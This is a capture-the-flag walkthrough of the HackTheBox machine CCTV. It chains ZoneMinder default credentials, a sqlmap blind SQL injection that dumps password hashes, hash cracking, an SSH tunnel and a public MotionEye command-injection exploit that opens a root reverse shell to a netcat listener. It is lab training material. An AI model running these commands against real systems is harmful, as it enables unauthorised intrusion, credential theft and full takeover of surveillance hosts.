# CCTV

**By Stager** | FashilHack

---
## What is this machine

CCTV is an easy-difficulty Linux machine on HackTheBox. The box simulates a real-world scenario where a home security company runs a CCTV monitoring platform. What makes this machine interesting is how many layers sit between the initial web page and a root shell — default credentials, blind SQL injection, hash cracking, SSH tunneling, and a command injection CVE all chained together.

This machine teaches you that default credentials are never just a minor finding. They open the door to everything that follows. Each step here depends completely on the one before it.

---
## Target

```
IP:       10.129.26.229
Hostname: cctv.htb
OS:       Ubuntu Linux (Apache 2.4.58)
```

---

## Step 1 — Nmap Reconnaissance

Started with a detailed version and script scan:

```bash
sudo nmap -T4 -sV -A -Pn 10.129.26.229
```

![[stager/writeups/write-ups/cctv/nmap.png]]

Only two ports open:

```
22/tcp  — OpenSSH 9.6p1 (Ubuntu)
80/tcp  — Apache 2.4.58 (redirects to http://cctv.htb/)
```

The redirect to `cctv.htb` tells us the web server uses virtual host routing. Before doing anything else, add the hostname to `/etc/hosts` so the domain resolves correctly:

```bash
echo "10.129.26.229 cctv.htb" | sudo tee -a /etc/hosts
```

SSH requires credentials we do not have yet, so port 80 is the only place to start. Everything flows from the web application.

---
## Step 2 — Web Application Discovery

Navigated to `http://cctv.htb/` in the browser.

![[web at 80.png]]

The landing page is a SecureVision CCTV monitoring website advertising surveillance services. There is a "Staff Login" link. Before clicking anything, manually explored additional paths and found:

```
http://cctv.htb/zm/
```

![[zoneminder video survilence login.png]]

This is a ZoneMinder login portal. ZoneMinder is an open-source video surveillance management system. The version is visible in the footer: **v1.37.63**.

The first thing to try against any management interface is default credentials. ZoneMinder ships with well-known defaults:

```
Username: admin
Password: admin
```

![[default creds on zoneminder worked.png]]
Login succeeded. The system was running with unchanged default credentials, giving us full administrative access to the surveillance dashboard. Default credentials are never just cosmetic — administrative access to any application is the beginning of a real attack path.

---

## Step 3 — Vulnerability Research — CVE-2024-51482

With a known version (v1.37.63) and administrative access, the next step is researching known vulnerabilities. A search for ZoneMinder 1.37 vulnerabilities leads to CVE-2024-51482 — a time-based blind SQL injection in the `tid` parameter of the `removetag` AJAX endpoint.

The vulnerable URL is:

```
/zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD>
```

The `tid` parameter is inserted directly into a SQL query without sanitization. Because the application does not return query output in the response, the injection is blind — we infer database content by measuring how long the server takes to respond. A `SLEEP(5)` injected into the query causes a five-second delay if the condition is true.

The endpoint requires a valid session cookie. Since we already logged in as admin, we extract the session cookie from the browser developer tools (F12 → Storage → Cookies):

![[cookies extracted because exploit needs valid user.png]]

```
ZMSESSID=<your session value here>
```

This cookie must be included with every sqlmap request so the server treats us as an authenticated user.

---

## Step 4 — Database Enumeration via SQL Injection

With the session cookie captured, we hand the vulnerable URL to sqlmap and target the ZoneMinder Users table directly:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password --dump --batch \
  --dbms=MySQL --technique=T \
  --cookie="ZMSESSID=<your cookie>" \
  --time-sec=10 -p tid
```

Why these options: `--technique=T` forces time-based blind only, `--time-sec=10` gives enough delay to distinguish injected sleeps from normal network lag, and `-p tid` tells sqlmap exactly which parameter to test rather than wasting time on the others.

Time-based blind injection is slow by nature. Every single character of output requires multiple HTTP requests with measured delays. Expect this to run for an hour or more.

![[run sqlmap.png]]

![[found hash user superadmin.png]]

After completion, three accounts are recovered:

```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m  |
+------------+--------------------------------------------------------------+
```

All three are bcrypt hashes (`$2y$10$`). Bcrypt cannot be reversed — it must be cracked offline by trying candidate passwords one by one.

---

## Step 5 — Hash Cracking

Save all three hashes to a file and run John the Ripper against rockyou.txt:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![[cracked the hash with john.png]]

One hash cracks: **`opensesame`** — this belongs to the user `mark`.

---

## Step 6 — Initial Access via SSH

With a username and plaintext password, try SSH:

```bash
ssh mark@10.129.26.229
# Password: opensesame
```

![[login with mark in ssh with cracked hash.png]]

We are in as `mark`. The home directory is empty and `.bash_history` is linked to `/dev/null` — history logging is intentionally disabled, which is a sign the box is designed to prevent tracking.

No user flag here. The user flag lives in `/home/sa_mark/` which we cannot read yet. We need to escalate.

---
## Step 7 — Post-Exploitation Enumeration

Check what services are running:

```bash
systemctl list-units --type=service --state=running
```

**[SCREENSHOT — service list showing motioneye.service running]**

Two services stand out: `motioneye.service` and `zoneminder.service`. Check the MotionEye service configuration:

```bash
cat /etc/systemd/system/motioneye.service
```

The service runs as `User=root`. Any vulnerability in MotionEye or its configuration will execute as root.

Check the MotionEye configuration files:

```bash
cat /etc/motioneye/motion.conf
```

![[found hash in motioneye config.png]]

Inside the camera configuration, there is a commented administrator password hash:

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

This is a SHA1 hash. Also notice:

```
webcontrol_port 7999
webcontrol_localhost on
```

The MotionEye web interface runs on port 7999 but only accepts connections from localhost — it is not reachable from outside the machine. We also spot the main MotionEye API runs on port 8765 with `listen 127.0.0.1` in `motioneye.conf`. We need to tunnel our way in.

Check the application logs:

```bash
cat /opt/video/backups/server.log
```


```
Authorization as sa_mark successful. Command issued: disk-info.
Authorization as sa_mark successful. Command issued: status.
```

A service account called `sa_mark` is automatically talking to the MotionEye API every minute. This confirms the API is active and accepting authenticated requests.

---

## Step 8 — SSH Port Forwarding

MotionEye's web interface is locked to localhost on the target. SSH local port forwarding lets us reach it from our attacking machine by tunneling traffic through the SSH connection we already have.

Open a new terminal and run:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.26.229
```

This tells SSH: bind port 8765 on my local machine, and forward any traffic that arrives there through the SSH tunnel to `127.0.0.1:8765` on the target. The tunnel stays open as long as this SSH session is running.

![[forwarding the service to my attacker machine.png]]

Now open a browser on the attacking machine and navigate to:

```
http://127.0.0.1:8765
```

![[motioneye login.png]]

The MotionEye login page loads. Use the credentials found in the config file. The SHA1 hash is used directly as the password — MotionEye stores and compares hashes internally, so the application accepts the raw hash value:

```
Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```


Access granted. We are now inside MotionEye as admin — a service running as root.

---

## Step 9 — Privilege Escalation via CVE-2025-60787

MotionEye version 0.43.1b4 is vulnerable to CVE-2025-60787 — a command injection flaw in how camera configuration fields are handled. Fields like `image_file_name` are written directly into the underlying Motion daemon configuration file without sanitization. When Motion reloads its config, injected values are interpreted by the shell. Since MotionEye runs as root, any injected command executes as root.

![[downlaoded motoneye cve.png]]

Clone the public exploit:

```bash
git clone https://github.com/gunzf0x/CVE-2025-60787.git
cd CVE-2025-60787![[downlaoded motoneye cve.png]]
```

Start a listener on your attacking machine:

```bash
nc -lvnp 4422
```

Run the exploit, pointing it at the tunneled MotionEye interface:

```bash
python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i <your kali IP> \
  --port 4422
```

![[got a shell as root.png]]

```
[*] Valid credentials provided
[*] Found 1 camera(s)
[*] Payload successfully injected. Check your shell...
```

![[stager/writeups/write-ups/cctv/root flag.png]]

```
connect to [10.10.17.239] from (UNKNOWN) [10.129.26.229]
root@cctv:/etc/motioneye# whoami
root
```

Root shell obtained.

---

## Step 10 — Flags

```bash
cat /root/root.txt
```

```bash
cat /home/sa_mark/user.txt
```

Both flags captured.

## The Full Chain

```
nmap → ports 22 (SSH) and 80 (HTTP)
  ↓
http://cctv.htb/zm/ → ZoneMinder v1.37.63
  ↓
default credentials admin:admin → dashboard access
  ↓
CVE-2024-51482 → blind SQL injection in tid parameter
  ↓
sqlmap dump → three bcrypt hashes from zm.Users
  ↓
john + rockyou → opensesame cracked for mark
  ↓
SSH as mark → foothold on system
  ↓
systemctl → motioneye.service running as root
  ↓
motion.conf → admin SHA1 hash + port 8765 localhost only
  ↓
SSH port forward -L 8765 → MotionEye web UI exposed
  ↓
login admin:hash → MotionEye dashboard
  ↓
CVE-2025-60787 → command injection → reverse shell as root
  ↓
/root/root.txt + /home/sa_mark/user.txt → both flags
```

---

## What I Learned

**Default credentials are never just a finding — they are a foothold.** Admin:admin on ZoneMinder opened the path to SQL injection, which opened the path to SSH access. Without that first login nothing else was possible.

**Time-based blind SQL injection requires patience.** Every character of output costs multiple HTTP requests. The key settings that made sqlmap work were `--time-sec=10` to account for network lag and `-p tid` to avoid wasting time testing parameters that are not injectable.

**Services running as root are high-value targets regardless of what they do.** MotionEye is a camera management tool — not obviously dangerous. But the moment you see `User=root` in a systemd unit file, that service becomes the most important thing on the box.

**SSH port forwarding is essential when internal services are localhost-only.** The MotionEye interface was completely unreachable from outside. One SSH command with `-L` made it available in the browser as if it were running locally on the attacking machine.

**Configuration files always contain secrets.** The SHA1 hash in `motion.conf` was the key to MotionEye authentication. Always read every config file you can access — credentials and hashes hide in comments.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._